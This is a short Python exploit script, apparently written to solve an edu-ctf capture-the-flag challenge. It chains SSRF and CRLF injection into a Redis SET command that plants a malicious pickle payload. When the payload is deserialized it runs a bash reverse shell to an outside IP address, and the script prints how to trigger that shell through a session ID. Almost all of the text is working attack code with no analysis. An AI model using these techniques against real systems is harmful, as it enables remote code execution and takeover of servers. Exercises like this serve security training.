# env = python 3.7.5
import urllib, requests, socket
import os
import pickle, redis
#-------------OK---------------#
# send payload
url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:e05097b2-fece-466f-b1be-a49909eda558" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c \'bash -i >%26 /dev/tcp/140.112.90.24/9527 0>%261\'q\x01\x85q\x02Rq\x03."%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'

r = requests.post('https://edu-ctf.csie.org:10163', data={'url': url_post}, verify=False)
print(r.status_code, r.text)

# make payload to db
r2 = requests.get(r.text, verify=False)
print(r2.status_code, r2.text)

print('visit [%s] in broewer with session ID [%s] for reverse shell' % (r.text, "session:e05097b2-fece-466f-b1be-a49909eda558"))